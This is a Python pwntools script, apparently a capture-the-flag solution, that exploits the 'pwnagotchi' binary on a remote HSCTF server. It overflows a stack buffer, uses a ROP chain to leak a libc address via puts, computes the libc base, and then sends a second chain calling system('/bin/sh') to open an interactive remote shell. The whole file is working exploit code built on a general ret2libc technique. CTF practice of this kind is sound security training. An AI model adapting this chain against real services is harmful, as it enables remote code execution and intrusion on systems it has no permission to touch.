""" The following script was based heavily on the script provided in the following url """
"""           https://tasteofsecurity.com/security/ret2libc-unknown-libc/              """

from pwn import * # Import pwntools

p = remote("pwn.hsctf.com", 5005)
#p = process("./pwnagotchi") # start the vuln binary
elf = ELF("./pwnagotchi") # Extract data from binary
rop = ROP(elf) # Find ROP gadgets
libc = ELF("./libc-2.27.so")

# Find addresses for puts, __libc_start_main and a `pop rdi;ret` gadget
GETS = elf.plt['gets']
PUTS = elf.plt['puts']
LIBC_START_MAIN = elf.symbols['__libc_start_main']
POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0] # Same as ROPgadget --binary vuln | grep "pop rdi"
EAT = elf.symbols['eat']
MAIN = elf.symbols['main']
RET = (rop.find_gadget(['ret']))[0]
ONCE = 0x0601099

log.info("gets@plt: " + hex(GETS))
log.info("puts@plt: " + hex(PUTS))
log.info("__libc_start_main: " + hex(LIBC_START_MAIN))
log.info("pop rdi gadget: " + hex(POP_RDI))

base = b"A"*8 + b"B"*12 #Overflow buffer until return address
# Create rop chain
rop = base + p64(RET) + p64(POP_RDI) + p64(LIBC_START_MAIN) +  p64(PUTS) + p64(POP_RDI) + p64(ONCE) + p64(GETS) + p64(POP_RDI) + p64(ONCE) + p64(GETS) + p64(EAT) + p64(MAIN) 
#Send our rop-chain payload
p.sendline(rop)
p.sendline(p64(0x00))
p.sendline(p64(0x00))
#Parse leaked address
print(p.recvline())
print(p.recvline())
print(p.recvline())
print(p.recvline())
print(p.recvline())
received = p.recvline()
received = received.strip()
print(received)
leak = u64(received.ljust(8, b"\x00"))
log.info("Leaked libc address,  __libc_start_main: %s" % hex(leak))

libc.address = leak - libc.sym["__libc_start_main"]
log.info("Address of libc %s " % hex(libc.address))

BINSH = next(libc.search(b"/bin/sh")) #Verify with find /bin/sh
SYSTEM = libc.sym["system"]

log.info("bin/sh %s " % hex(BINSH))
log.info("system %s " % hex(SYSTEM))
print(rop)

rop2 = base + p64(RET) +  p64(POP_RDI) + p64(BINSH) + p64(SYSTEM)
#print(rop2)
p.sendline(rop2)
p.interactive()
p.close()

